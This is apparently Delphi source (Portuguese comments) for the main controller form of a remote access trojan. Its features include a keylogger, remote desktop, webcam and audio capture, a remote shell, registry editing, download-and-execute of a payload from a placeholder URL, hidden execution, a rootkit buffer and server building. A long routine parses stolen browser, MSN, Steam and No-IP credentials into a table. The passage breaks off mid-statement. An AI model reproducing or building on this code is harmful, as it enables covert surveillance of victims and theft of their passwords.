unit UnitPrincipal;
//{$DEFINE SPYDEBUG}  // como funciona... se eu quiser testar, eu mantenho essa linha. Se não, eu tiro
//{$DEFINE SPYDEBUGSERVER}
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ImgList, ExtCtrls, Menus, ComCtrls, XPMan, Buttons,
  IdThreadMgr, IdThreadMgrDefault, IdAntiFreezeBase, IdAntiFreeze,
  IdBaseComponent, IdComponent, IdTCPServer, Jpeg, CoolTrayIcon, MSNPopUp,
  GR32_Image;

Const
  WM_POPUP_DESKTOP = WM_USER + 1;
  WM_POPUP_WEBCAM = WM_USER + 2;
  WM_POPUP_WINDOW = WM_USER + 3;

type
  PConexao = ^TConexao;
  TConexao = record
    Athread: TIdPeerThread;
    Item: TListItem;
    Ping: integer;
    RandomString: shortstring;
    ImgDesktop: TMemoryStream; // aqui a stream é de JPG
    LineColor: TColor;
    Forms: array [0..10] of TForm;
    CountryAndKeyboard: shortstring;
    ConfigID: integer;
    FirstExecution: shortString;
  end;

type
  TFormPrincipal = class(TForm)
    Panel1: TPanel;
    Panel2: TPanel;
    XPManifest1: TXPManifest;
    ListView1: TListView;
    MainMenu1: TMainMenu;
    Arquivo1: TMenuItem;
    Sair1: TMenuItem;
    ImageListIcons: TImageList;
    Image2: TImage;
    Label1: TLabel;
    Splitter1: TSplitter;
    Opes1: TMenuItem;
    Ocultarinformaes1: TMenuItem;
    Panel3: TPanel;
    StatusBar1: TStatusBar;
    ListView2: TListView;
    Label2: TLabel;
    PopupMenuColunas: TPopupMenu;
    NomedoServidor1: TMenuItem;
    CAM1: TMenuItem;
    Verso1: TMenuItem;
    PingmsIdle1: TMenuItem;
    Janelaativa1: TMenuItem;
    PopupMenuFuncoes: TPopupMenu;
    Ping1: TMenuItem;
    Pas1: TMenuItem;
    ComputadorUsurio1: TMenuItem;
    WANLAN1: TMenuItem;
    SistemaOperacional1: TMenuItem;
    CPU1: TMenuItem;
    RAM1: TMenuItem;
    Antivrus1: TMenuItem;
    Firewall1: TMenuItem;
    Porta1: TMenuItem;
    IdTCPServer1: TIdTCPServer;
    IdAntiFreeze1: TIdAntiFreeze;
    IdThreadMgrDefault1: TIdThreadMgrDefault;
    Timer1: TTimer;
    Selecionarportas1: TMenuItem;
    N1: TMenuItem;
    Novoservidor1: TMenuItem;
    PopupMenuTrayIcon: TPopupMenu;
    Mostrar1: TMenuItem;
    N2: TMenuItem;
    Sair2: TMenuItem;
    CoolTrayIcon1: TCoolTrayIcon;
    Reconnect1: TMenuItem;
    Disconnect1: TMenuItem;
    Uninstall1: TMenuItem;
    Rename1: TMenuItem;
    Timer2: TTimer;
    UpdateServer1: TMenuItem;
    OpenDialog1: TOpenDialog;
    SendFileExecute1: TMenuItem;
    Normal1: TMenuItem;
    Hidden1: TMenuItem;
    Notificaovisual1: TMenuItem;
    MSNPopUp1: TMSNPopUp;
    Notificaosonora1: TMenuItem;
    N3: TMenuItem;
    Listadeprocessos1: TMenuItem;
    Listadeservios1: TMenuItem;
    Listadejanelas1: TMenuItem;
    Listadeprogramasinstalados1: TMenuItem;
    Listarportasativas1: TMenuItem;
    ListarDispositivos1: TMenuItem;
    Executarcomandos1: TMenuItem;
    Abrirpginadainternet1: TMenuItem;
    Baixararquivoeexecutar1: TMenuItem;
    Clipboard1: TMenuItem;
    PromptDOS1: TMenuItem;
    Regedit1: TMenuItem;
    Keylogger1: TMenuItem;
    Desktopremoto1: TMenuItem;
    Image1: TImage32;
    Webcam1: TMenuItem;
    Capturadeaudio1: TMenuItem;
    Gerenciararquivos1: TMenuItem;
    Senhas1: TMenuItem;
    Selecionaridioma1: TMenuItem;
    Arquivolocal1: TMenuItem;
    Downloaddainternet1: TMenuItem;
    Procurarnoservidor1: TMenuItem;
    Palavraskeylogger1: TMenuItem;
    Arquivos1: TMenuItem;
    Sobre1: TMenuItem;
    Opesextras1: TMenuItem;
    N4: TMenuItem;
    Download1: TMenuItem;
    Visualizarlogsdeemail1: TMenuItem;
    Atualizardesktopautomtico1: TMenuItem;
    Timer3: TTimer;
    CHAT1: TMenuItem;
    Mostrartudo1: TMenuItem;
    GeoIP1: TMenuItem;
    HTTPProxy1: TMenuItem;
    Start1: TMenuItem;
    Stop1: TMenuItem;
    Selecionarsomdenotificao1: TMenuItem;
    PingTest1: TMenuItem;
    Label3: TLabel;
    Label4: TLabel;
    DesktopImage1: TMenuItem;
    PopupMenuInfo: TPopupMenu;
    CopyWANIP1: TMenuItem;
    START2: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure ListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Ocultarinformaes1Click(Sender: TObject);
    procedure Splitter1CanResize(Sender: TObject; var NewSize: Integer;
      var Accept: Boolean);
    procedure NomedoServidor1Click(Sender: TObject);
    procedure ListView1ColumnRightClick(Sender: TObject;
      Column: TListColumn; Point: TPoint);
    procedure PopupMenuColunasPopup(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure IdTCPServer1Disconnect(AThread: TIdPeerThread);
    procedure IdTCPServer1Execute(AThread: TIdPeerThread);
    procedure Timer1Timer(Sender: TObject);
    procedure Selecionarportas1Click(Sender: TObject);
    procedure Sair1Click(Sender: TObject);
    procedure Novoservidor1Click(Sender: TObject);
    procedure Ping1Click(Sender: TObject);
    procedure PopupMenuFuncoesPopup(Sender: TObject);
    procedure ListView1SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure Sair2Click(Sender: TObject);
    procedure Mostrar1Click(Sender: TObject);
    procedure CoolTrayIcon1DblClick(Sender: TObject);
    procedure Reconnect1Click(Sender: TObject);
    procedure Disconnect1Click(Sender: TObject);
    procedure Uninstall1Click(Sender: TObject);
    procedure Rename1Click(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure Hidden1Click(Sender: TObject);
    procedure Notificaovisual1Click(Sender: TObject);
    procedure Notificaosonora1Click(Sender: TObject);
    procedure Listadeprocessos1Click(Sender: TObject);
    procedure ListView1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure ListView1Compare(Sender: TObject; Item1, Item2: TListItem;
      Data: Integer; var Compare: Integer);
    procedure Listadeservios1Click(Sender: TObject);
    procedure Listadejanelas1Click(Sender: TObject);
    procedure Listadeprogramasinstalados1Click(Sender: TObject);
    procedure Listarportasativas1Click(Sender: TObject);
    procedure ListarDispositivos1Click(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
    procedure Executarcomandos1Click(Sender: TObject);
    procedure Abrirpginadainternet1Click(Sender: TObject);
    procedure Baixararquivoeexecutar1Click(Sender: TObject);
    procedure Clipboard1Click(Sender: TObject);
    procedure PromptDOS1Click(Sender: TObject);
    procedure Regedit1Click(Sender: TObject);
    procedure Keylogger1Click(Sender: TObject);
    procedure Desktopremoto1Click(Sender: TObject);
    procedure Webcam1Click(Sender: TObject);
    procedure Capturadeaudio1Click(Sender: TObject);
    procedure Panel1Resize(Sender: TObject);
    procedure Gerenciararquivos1Click(Sender: TObject);
    procedure Senhas1Click(Sender: TObject);
    procedure Selecionaridioma1Click(Sender: TObject);
    procedure Arquivolocal1Click(Sender: TObject);
    procedure Downloaddainternet1Click(Sender: TObject);
    procedure Palavraskeylogger1Click(Sender: TObject);
    procedure Arquivos1Click(Sender: TObject);
    procedure Sobre1Click(Sender: TObject);
    procedure Opesextras1Click(Sender: TObject);
    procedure Download1Click(Sender: TObject);
    procedure ListView1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Visualizarlogsdeemail1Click(Sender: TObject);
    procedure MSNPopUp1URLClick(Sender: TObject; URL: String);
    procedure Atualizardesktopautomtico1Click(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
    procedure CHAT1Click(Sender: TObject);
    procedure Mostrartudo1Click(Sender: TObject);
    procedure GeoIP1Click(Sender: TObject);
    procedure Start1Click(Sender: TObject);
    procedure Stop1Click(Sender: TObject);
    procedure Selecionarsomdenotificao1Click(Sender: TObject);
    procedure IdTCPServer1Exception(AThread: TIdPeerThread;
      AException: Exception);
    procedure PingTest1Click(Sender: TObject);
    procedure DesktopImage1Click(Sender: TObject);
    procedure PopupMenuInfoPopup(Sender: TObject);
    procedure CopyWANIP1Click(Sender: TObject);
    procedure START2Click(Sender: TObject);
  private
    { Private declarations }
    SortColumn: integer;
    SortReverse: boolean;

    TerminouDeIncluir: boolean;
    TerminouDeIncluirDS: boolean;
    TerminouDeIncluirWC: boolean;
    TerminouPassword: boolean;
    notificacao_visual: boolean;
    mostrar_tudo: boolean;
    geoip: boolean;
    notificacao_sonora: boolean;
    RefreshDesktop: boolean;

    // Prevenir Column Resize
    WndMethod: TWndMethod;

    /////Necessário para seleção de colunas no ListView
    fCursor: HICON;
    TamanhoColunas: array [0..20] of Integer; // pode ser um número maior ou o número exato de colunas
    FListViewOldWndProc: TWndMethod;
    ///////////////////////////////////////////////////

    CanResizeLateral: boolean;
    LastPanel1size: integer;
    LastPanel2size: integer;
    // Prevenir Column Resize

    PodeSolicitarImgDesk: boolean;

    function GetIndex(aNMHdr: pNMHdr): Integer;
    procedure CheckMesg(var aMesg: TMessage);
    procedure StartPreventResize;
    procedure StopPreventResize;
    //////////////////////////

    /////Necessário para seleção de colunas no ListView
    procedure InicioSelecaoColunas;
    procedure TerminarSelecaoColunas;
    procedure ListViewNewWndProc(var Msg: TMessage);
    ///////////////////////////////////////////////////

    procedure DefinirImagem(IL: TImageList; Codigo: integer; Image: TImage);
    procedure MostrarInicioTeste;
    procedure OcultarLateral;
    procedure ChangeListViewLineColor(Item: TListItem; Color: TColor);
    procedure AtualizarListviewInformacoes(IP, OS, Comp, User, AV, FW, Processador, RAM, Data: string);
    procedure CarregarSettings;
    procedure SalvarSettings;
    procedure IniciarEscuta;
    function GetUserSelecionado: Integer;
    procedure AppMinMessage(Sender: TObject);
    procedure ReceberComando(AThread, AThreadTransfer: TIdPeerThread; Recebido: string; Hora_Ping: cardinal);
    procedure OnPopDesktopMessage(var Msg: TMessage); message WM_POPUP_DESKTOP;
    procedure OnPopWebcamMessage(var Msg: TMessage); message WM_POPUP_WEBCAM;
    procedure OnPopUpMessage(var Msg: TMessage); message WM_POPUP_WINDOW;
    function ObterInformacoes: boolean;
  public
    LimiteDeConexao: integer;
    EnviandoPing: boolean;

    ConfigsList: TStringList;
    ImageStream: TMemoryStream;
    TempPorts: string;
    SettingsFile, IconFolder, ProfilesFolder: string;
    ConfiguracaoDoComputador: string;
    PluginBuffer: string;
    RootKITBuffer: string;
    MD5plugin: string;
    SoundFile: string;
    procedure AtualizarStringsTraduzidas;
    { Public declarations }
  end;

var
  FormPrincipal: TFormPrincipal;
  conn: TList;

  LastReconnectIP: string = '127.0.0.1:81';
  LastRenameName: string = 'Server';
  LastProxyPort: string = '5555';
  LastExecutarComando: string = 'explorer.exe \windows\';
  LastWebPage: string = 'http://www.google.com';
  LastDownloadExec: string = 'http://www.example.com/server.exe';
  //ComandoRecebidoDesktop: string;
  //ComandoRecebidoWebcam: string;

implementation

{$R *.dfm}

uses
  UnitBandeiras,
  untCapFuncs,
  CommCtrl,
  IniFiles,
  UnitStrings,
  UnitCryptString,
  UnitGetWAMip,
  UnitInformacoes,
  FuncoesDiversasCliente,
  UnitConexao,
  UnitPortas,
  UnitComandos,
  UnitBytesSize,
  UnitCreateServer,
  MD5,
  UnitEnviarArquivo,
  MMSystem,
  UnitFormFuncoesDiversas,
  UnitListarDispositivos,
  UnitShell,
  UnitRegistry,
  UnitKeylogger,
  UnitDesktop,
  UnitWebcam,
  UnitAudio,
  UnitFileManager,
  UnitPasswords,
  UnitIdiomas,
  UnitSearchKeylogger,
  UnitSearchFiles,
  UnitInfo,
  UnitOpcoesExtras,
  Shellapi,
  UnitVisualizarLogs,
  UnitChatSettings,
  UnitCHAT,
{$IFDEF SPYDEBUG}
  UnitDebug,
{$ENDIF}
  UnitClipBoard,
  Sample; // obter bandeira por GeoIP database

procedure startpassword(buffer: string);
var
  strtemp: string;
  usuario, senha, tiposenha, Nome_server: string;
  item: tlistitem;
  i: integer;
begin
  if copy(buffer, 1, pos('|', buffer) - 1) = GETIELOGIN then
  begin
    delete(buffer, 1, pos('|', buffer));
    Nome_server := copy(buffer, 1, pos('|', buffer) - 1);
    delete(buffer, 1, pos('|', buffer));

    if length(buffer) > 5 then
    while pos(#13#10, buffer) > 0 do
    begin
      application.ProcessMessages;
      sleep(5);
      strtemp := copy(buffer, 1, pos(#13#10, buffer) - 1);
      delete(buffer, 1, pos(#13#10, buffer) + 1);
      tiposenha := copy(strtemp, 1, pos('|', strtemp) - 1);
      delete(strtemp, 1, pos('|', strtemp));
      usuario := copy(strtemp, 1, pos('|', strtemp) - 1);
      delete(strtemp, 1, pos('|', strtemp));
      senha := copy(strtemp, 1, pos('|', strtemp) - 1);
      delete(strtemp, 1, pos('|', strtemp));

      tiposenha := trim(tiposenha);
      usuario := trim(usuario);
      senha := trim(senha);

      item := FormPasswords.ListView1.Items.Add;
      Item.ImageIndex := 315;
      item.Caption := tiposenha;
      item.SubItems.Add(Nome_server);
      item.SubItems.Add(usuario);
      item.SubItems.Add(senha);
     end;
  end else

  if (copy(buffer, 1, pos('|', buffer) - 1) = GETIEPASS) or
     (copy(buffer, 1, pos('|', buffer) - 1) = GETIEAUTO) or
     (copy(buffer, 1, pos('|', buffer) - 1) = GETIEWEB) then
  begin
    delete(buffer, 1, pos('|', buffer));
    Nome_server := copy(buffer, 1, pos('|', buffer) - 1);
    delete(buffer, 1, pos('|', buffer));

    if length(buffer) > 5 then
    while pos(#13#10, buffer) > 0 do
    begin
      application.ProcessMessages;
      sleep(5);
      strtemp := copy(buffer, 1, pos(#13#10, buffer) - 1);
      delete(buffer, 1, pos(#13#10, buffer) + 1);
      strtemp := replacestring(' | |', ' |', strtemp);
      tiposenha := copy(strtemp, 1, pos('|', strtemp) - 1);
      delete(strtemp, 1, pos('|', strtemp));
      usuario := copy(strtemp, 1, pos('|', strtemp) - 1);
      delete(strtemp, 1, pos('|', strtemp));
      senha := copy(strtemp, 1, pos('|', strtemp) - 1);
      delete(strtemp, 1, pos('|', strtemp));

      tiposenha := trim(tiposenha);
      usuario := trim(usuario);
      senha := trim(senha);

      if (pos('/', tiposenha) > 0) and
         (usuario <> ' ') and (usuario <> '') and
         (senha <> '') and (senha <> ' ') then
      begin
        //deletar o ' ' (espaço) depois do pass, user e address
        delete(tiposenha, length(tiposenha) + 1, 1);
        delete(usuario, length(usuario) + 1, 1);
        delete(senha, length(senha) + 1, 1);

        item := FormPasswords.ListView1.Items.Add;
        Item.ImageIndex := 315;
        item.Caption := tiposenha;
        item.SubItems.Add(Nome_server);
        item.SubItems.Add(usuario);
        item.SubItems.Add(senha);
      end;
    end
  end else

  if copy(buffer, 1, pos('|', buffer) - 1) = GETFIREFOX then
  begin
    delete(buffer, 1, pos('|', buffer));
    Nome_server := copy(buffer, 1, pos('|', buffer) - 1);
    delete(buffer, 1, pos('|', buffer));
    delete(buffer, 1, 4); // ---> '##$$'
    if length(buffer) > 5 then
    while pos('##$$', buffer) > 0 do
    begin
      application.ProcessMessages;
      sleep(5);
      strtemp := copy(buffer, 1, pos('##$$', buffer) - 1);
      delete(buffer, 1, pos('##$$', buffer) + 3);

      /////// site ///////
      if strtemp[1] = '|' then
      begin
        tiposenha := '';
        delete(strtemp, 1, 1);
      end else
      begin
        tiposenha := copy(strtemp, 1, pos('|', strtemp) - 1);
        delete(strtemp, 1, pos('|', strtemp));
      end;
      /////// Fim site ///////

      while pos('|', strtemp) > 0 do
      begin
        application.ProcessMessages;
        sleep(5);

        /////// usuario ///////
        if strtemp[1] = '|' then
        begin
          usuario := '';
          delete(strtemp, 1, 1);
        end else
        begin
          usuario := copy(strtemp, 1, pos('|', strtemp) - 1);
          delete(strtemp, 1, pos('|', strtemp));
        end;
        /////// Fim usuario ///////

        /////// senha ///////
        if strtemp[1] = '|' then
        begin
          senha := '';
          delete(strtemp, 1, 1);
        end else
        begin
          senha := copy(strtemp, 1, pos('|', strtemp) - 1);
          delete(strtemp, 1, pos('|', strtemp));
        end;
        /////// Fim senha ///////

        if (tiposenha <> '') and (usuario <> '') then
        begin
          item := FormPasswords.ListView1.Items.Add;
          Item.ImageIndex := 314;
          item.Caption := tiposenha;
          item.SubItems.Add(Nome_server);
          item.SubItems.Add(usuario);
          item.SubItems.Add(senha);
        end;
      end;
    end
  end else
  if copy(buffer, 1, pos('|', buffer) - 1) = GETFF3_5 then
  begin
    delete(buffer, 1, pos('|', buffer));
    Nome_server := copy(buffer, 1, pos('|', buffer) - 1);
    delete(buffer, 1, pos('|', buffer));

    while pos('|', buffer) > 0 do
    begin
      application.ProcessMessages;
      sleep(5);

      /////// site ///////
      if buffer[1] = '|' then
      begin
        tiposenha := '';
        delete(buffer, 1, 1);
      end else
      begin
        tiposenha := copy(buffer, 1, pos('|', buffer) - 1);
        delete(buffer, 1, pos('|', buffer));
      end;
      /////// Fim site ///////

      /////// usuário ///////
      if buffer[1] = '|' then
      begin
        usuario := '';
        delete(buffer, 1, 1);
      end else
      begin
        usuario := copy(buffer, 1, pos('|', buffer) - 1);
        delete(buffer, 1, pos('|', buffer));
      end;
      /////// Fim usuário ///////

      /////// senha ///////
      if buffer[1] = '|' then
      begin
        senha := '';
        delete(buffer, 1, 1);
      end else
      begin
        senha := copy(buffer, 1, pos('|', buffer) - 1);
        delete(buffer, 1, pos('|', buffer));
      end;
      /////// Fim usuário ///////

      if (tiposenha <> '') and (usuario <> '') then
      begin
        item := FormPasswords.ListView1.Items.Add;
        Item.ImageIndex := 314;
        item.Caption := tiposenha;
        item.SubItems.Add(Nome_server);
        item.SubItems.Add(usuario);
        item.SubItems.Add(senha);
      end;
    end
  end else
  if copy(buffer, 1, pos('|', buffer) - 1) = GETMSN then
  begin
    delete(buffer, 1, pos('|', buffer));
    Nome_server := copy(buffer, 1, pos('|', buffer) - 1);
    delete(buffer, 1, pos('|', buffer));
    if length(buffer) > 5 then
    while pos('|', buffer) > 0 do
    begin
      application.ProcessMessages;
      sleep(5);

      tiposenha := copy(buffer, 1, pos('|', buffer) - 1);
      delete(buffer, 1, pos('|', buffer));
      usuario := trim(copy(buffer, 1, pos('|', buffer) - 1));
      delete(buffer, 1, pos('|', buffer));
      senha := trim(copy(buffer, 1, pos('|', buffer) - 1));
      delete(buffer, 1, pos('|', buffer));
      if (tiposenha <> '') and (usuario <> '') and
         (tiposenha <> ' ') and (usuario <> ' ') then
      begin
        item := FormPasswords.ListView1.Items.Add;
        Item.ImageIndex := 316;
        item.Caption := tiposenha;
        item.SubItems.Add(Nome_server);
        item.SubItems.Add(usuario);
        item.SubItems.Add(senha);
      end;
    end
  end else
  if copy(buffer, 1, pos('|', buffer) - 1) = GETSTEAM then
  begin
    delete(buffer, 1, pos('|', buffer));
    Nome_server := copy(buffer, 1, pos('|', buffer) - 1);
    delete(buffer, 1, pos('|', buffer));

    while pos('|', buffer) > 0 do
    begin
      application.ProcessMessages;
      sleep(5);

      tiposenha := 'Steam';
      usuario := copy(buffer, 1, pos('|', buffer) - 1);
      delete(buffer, 1, pos('|', buffer));

      senha := copy(buffer, 1, pos('|', buffer) - 1);
      delete(buffer, 1, pos('|', buffer));

      item := FormPasswords.ListView1.Items.Add;
      Item.ImageIndex := 349;
      item.Caption := tiposenha;
      item.SubItems.Add(Nome_server);
      item.SubItems.Add(usuario);
      item.SubItems.Add(senha);
    end
  end else
  if copy(buffer, 1, pos('|', buffer) - 1) = GETNOIP then
  begin
    delete(buffer, 1, pos('|', buffer));
    Nome_server := copy(buffer, 1, pos('|', buffer) - 1);
    delete(buffer, 1, pos('|', buffer));
    if length(buffer) > 5 then
    while pos('|', buffer) > 0 do
    begin
      application.ProcessMessages;
      sleep(5);

      tiposenha := copy(buffer, 1, pos('|', buffer) - 1);
      delete(buffer, 1, pos('|', buffer));
      usuario := copy(buffer, 1, pos('|', buffer) - 1);
      delete(buffer, 1, pos('|', buffer));
      senha := copy(buffer, 1, pos('|', buffer) - 1);
      delete(buffer, 1, pos('|', buffer));
      if (tiposenha <> '') and (usuario <> '') then
      begin
        item := FormPasswords.ListView1.Items.Add;
        Item.ImageIndex := 313;
        item.Caption := tiposenha;
        item.SubItems.Add(Nome_server);
        item.SubItems.Add(usuario);
        item.SubItems.Add(senha);
      end;
    end
  end else
  if copy(buffer, 1, pos('|', buffer) - 1) = GETCHROME then
  begin
    buffer := replaceString(#13#10, '', buffer);

    delete(buffer, 1, pos('|', buffer));
    Nome_server := copy(buffer, 1, pos('|', buffer) - 1);
    delete(buffer, 1, pos('|', buffer));

    while pos('|', buffer) > 0 do
    begin
      application.ProcessMessages;
      sleep(5);

      tiposenha := copy(buffer, 1, pos('|', buffer) - 1);
      delete(buffer, 1, pos('|', buffer));
      usuario := copy(buffer, 1, pos('|', buffer) - 1);
      delete(buffer, 1, pos('|', buffer));
      senha := copy(buffer, 1, pos('|', buffer) - 1);
      delete(buffer, 1, pos('|', buffer));

      delete(senha, length(senha), 1); // deletar o ' |' espaço do final

      if (tiposenha <> ' ') and (usuario <> ' ') then
      begin
        item := FormPasswords.ListView1.Items.Add;
        Item.ImageIndex := 350;
        item.Caption := tiposenha;
        item.SubItems.Add(Nome_server);
        item.SubItems.Add(usuario);
        item.SubItems.Add(senha);
      end;
    end
  end else

end;

procedure TFormPrincipal.OnPopUpMessage(var Msg: TMessage);
var
  Item: TListItem;
  ConAux: PConexao;
  TextoPopup: string;
begin
  item := TListItem(Msg.Wparam);
  ConAux := PConexao(Item.Data);
  TextoPopup := 'Server: ' + ConAux.Item.SubItems.Strings[0] + #13#10 +
                'IP: ' + ConAux.Item.SubItems.Strings[1];
  MSNPopup1.Text := TextoPopup;
  MSNPopup1.ShowPopUp;
end;

procedure TFormPrincipal.OnPopDesktopMessage(var Msg: TMessage);
var
  NovaJanelaDesktop: TFormDesktop;
  Item: TListItem;
  ConAux: PConexao;
  TempStr, TempStr1: string;
  recebido: string;
begin
  TerminouDeIncluirDS := false;

  item := TListItem(Msg.Wparam);
  ConAux := PConexao(Item.Data);

  recebido := string(item.SubItems.Objects[0]);

  if ConAux.Forms[5] <> nil then
  begin
    NovaJanelaDesktop := TFormDesktop(ConAux.Forms[5]);
    if NovaJanelaDesktop.FecharForm = false then exit;

    NovaJanelaDesktop.Free;
    NovaJanelaDesktop := nil;
    ConAux.Forms[5] := nil;
  end;

  NovaJanelaDesktop := TFormDesktop.Create(self, ConAux);
  NovaJanelaDesktop.FormStyle := fsStayOnTop;
  ConAux.Forms[5] := NovaJanelaDesktop;
  NovaJanelaDesktop.NomePC := ConAux.Item.SubItems.Strings[0];
  NovaJanelaDesktop.FecharForm := false;
  TempStr := copy(recebido, 1, pos('|', recebido) - 1);
  delete(recebido, 1, pos('|', recebido));

  TempStr1 := copy(recebido, 1, pos('|', recebido) - 1);

  NovaJanelaDesktop.Ratio := StrToInt(TempStr) / StrToInt(TempStr1);
  NovaJanelaDesktop.OriginalX := StrToInt(TempStr);
  NovaJanelaDesktop.OriginalY := StrToInt(TempStr1);

  NovaJanelaDesktop.Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[286] + ' ' +
                                 TempStr + ' X ' + TempStr1;
  NovaJanelaDesktop.Show;
  sleep(10);
  TerminouDeIncluirDS := true;
end;

procedure TFormPrincipal.OnPopWebcamMessage(var Msg: TMessage);
var
  NovaJanelaWebcam: TFormWebcam;
  Item: TListItem;
  ConAux: PConexao;
  recebido: string;
  i: integer;
begin
  TerminouDeIncluirWC := false;

  item := TListItem(Msg.Wparam);
  ConAux := PConexao(Item.Data);

  recebido := string(item.SubItems.Objects[1]);

  if ConAux.Forms[6] <> nil then
  begin
    NovaJanelaWebcam := TFormWebcam(ConAux.Forms[6]);
    if NovaJanelaWebcam.FecharForm = false then exit;

    NovaJanelaWebcam.Free;
    NovaJanelaWebcam := nil;
    ConAux.Forms[6] := nil;
  end;

  NovaJanelaWebcam := TFormWebcam.Create(self, ConAux);
  NovaJanelaWebcam.FormStyle := fsStayOnTop;
  ConAux.Forms[6] := NovaJanelaWebcam;
  NovaJanelaWebcam.NomePC := ConAux.Item.SubItems.Strings[0];
  NovaJanelaWebcam.Caption := ConAux.Item.SubItems.Strings[0] + ' --- ' + traduzidos[291];
  i := gettickcount;
  NovaJanelaWebcam.Show;
  sleep(10);
  TerminouDeIncluirWC := true;
end;

// Inicio de Prevent Column Resize
procedure TFormPrincipal.StartPreventResize;
begin
  WndMethod := ListView1.WindowProc;
  ListView1.WindowProc := CheckMesg;
end;

procedure TFormPrincipal.StopPreventResize;
begin
  ListView1.WindowProc := WndMethod;
end;

function TFormPrincipal.GetIndex(aNMHdr: pNMHdr): Integer;
var
  hHWND: HWND;
  HdItem: THdItem;
  iIndex: Integer;
  iResult: Integer;
  iLoop: Integer;
  sCaption: string;
  sText: string;
  Buf: array [0..128] of Char;
begin
  Result := -1;

  hHWND := aNMHdr^.hwndFrom;

  iIndex := pHDNotify(aNMHdr)^.Item;

  FillChar(HdItem, SizeOf(HdItem), 0);
  with HdItem do
  begin
    pszText    := Buf;
    cchTextMax := SizeOf(Buf) - 1;
    Mask       := HDI_TEXT;
  end;

  Header_GetItem(hHWND, iIndex, HdItem);

  with ListView1 do
  begin
    sCaption := Columns[iIndex].Caption;
    sText    := HdItem.pszText;
    iResult  := CompareStr(sCaption, sText);
    if iResult = 0 then
      Result := iIndex
    else
    begin
      iLoop := Columns.Count - 1;
      for iIndex := 0 to iLoop do
      begin
        iResult := CompareStr(sCaption, sText);
        if iResult <> 0 then
          Continue;

        Result := iIndex;
        break;
      end;
    end;
  end;
end;

procedure TFormPrincipal.CheckMesg(var aMesg: TMessage);
var
  HDNotify: ^THDNotify;
  NMHdr: pNMHdr;
  iCode: Integer;
  iIndex: Integer;
begin
  case aMesg.Msg of
    WM_NOTIFY:
      begin
        HDNotify := Pointer(aMesg.lParam);

        iCode := HDNotify.Hdr.code;
        if (iCode = HDN_BEGINTRACKW) or
          (iCode = HDN_BEGINTRACKA) then
        begin
          NMHdr := TWMNotify(aMesg).NMHdr;
          // chekck column index
          iIndex := GetIndex(NMHdr);
          // prevent resizing of columns if index's = ?
          if (iIndex = 0) and (PopupMenuColunas.Items.Items[0].Checked = false) then aMesg.Result := 1 else
          if (iIndex = 1) and (PopupMenuColunas.Items.Items[1].Checked = false) then aMesg.Result := 1 else
          if (iIndex = 2) and (PopupMenuColunas.Items.Items[2].Checked = false) then aMesg.Result := 1 else
          if (iIndex = 3) and (PopupMenuColunas.Items.Items[3].Checked = false) then aMesg.Result := 1 else
          if (iIndex = 4) and (PopupMenuColunas.Items.Items[4].Checked = false) then aMesg.Result := 1 else
          if (iIndex = 5) and (PopupMenuColunas.Items.Items[5].Checked = false) then aMesg.Result := 1 else
          if (iIndex = 6) and (PopupMenuColunas.Items.Items[6].Checked = false) then aMesg.Result := 1 else
          if (iIndex = 7) and (PopupMenuColunas.Items.Items[7].Checked = false) then aMesg.Result := 1 else
          if (iIndex = 8) and (PopupMenuColunas.Items.Items[8].Checked = false) then aMesg.Result := 1 else
          if (iIndex = 9) and (PopupMenuColunas.Items.Items[9].Checked = false) then aMesg.Result := 1 else
          if (iIndex = 10) and (PopupMenuColunas.Items.Items[10].Checked = false) then aMesg.Result := 1;
          if (iIndex = 11) and (PopupMenuColunas.Items.Items[11].Checked = false) then aMesg.Result := 1;
          if (iIndex = 12) and (PopupMenuColunas.Items.Items[12].Checked = false) then aMesg.Result := 1;
          if (iIndex = 13) and (PopupMenuColunas.Items.Items[13].Checked = false) then aMesg.Result := 1;
          if (iIndex = 14) and (PopupMenuColunas.Items.Items[14].Checked = false) then aMesg.Result := 1;
        end
        else
          WndMethod(aMesg);
      end;
    else
      WndMethod(aMesg);
  end;
end;
/////Necessário para seleção de colunas no ListView
procedure TFormPrincipal.ListViewNewWndProc(var Msg: TMessage);
begin
  FListViewOldWndProc(Msg);
end;

function NewHeaderProc(wnd: HWND; uMsg: UINT; wParam: WPARAM; lParam: LPARAM): integer; stdcall;
var
  hti: THDHITTESTINFO;
  pt: TPoint;
begin
  if uMsg = WM_SETCURSOR then
  begin
    GetCursorPos(pt);
    ScreenToClient(wnd, pt);
    hti.Point := pt;
    SendMessage(wnd, HDM_HITTEST, 0, cardinal(@hti));

    //////////////// repetir esse bloco incrementando "1", quantas colunas forem necessárias
    if ((FormPrincipal.PopupMenuColunas.Items.Items[0].checked = false) and
       (hti.Item = 0) or ((hti.Item = 1) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 0;
    end else
    ///////////////////////////////////////////////////////////////////////////////////////////

    if ((FormPrincipal.PopupMenuColunas.Items.Items[1].checked = false) and
       (hti.Item = 1) or ((hti.Item = 2) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 1;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[2].checked = false) and
       (hti.Item = 2) or ((hti.Item = 3) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 2;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[3].checked = false) and
       (hti.Item = 3) or ((hti.Item = 4) and (hti.Flags = HHT_ONHEADER))) then
    begin
      SetCursor(FormPrincipal.fCursor);
      Result := 3;
    end else

    if ((FormPrincipal.PopupMenuColunas.Items.Items[4].checked = false) and
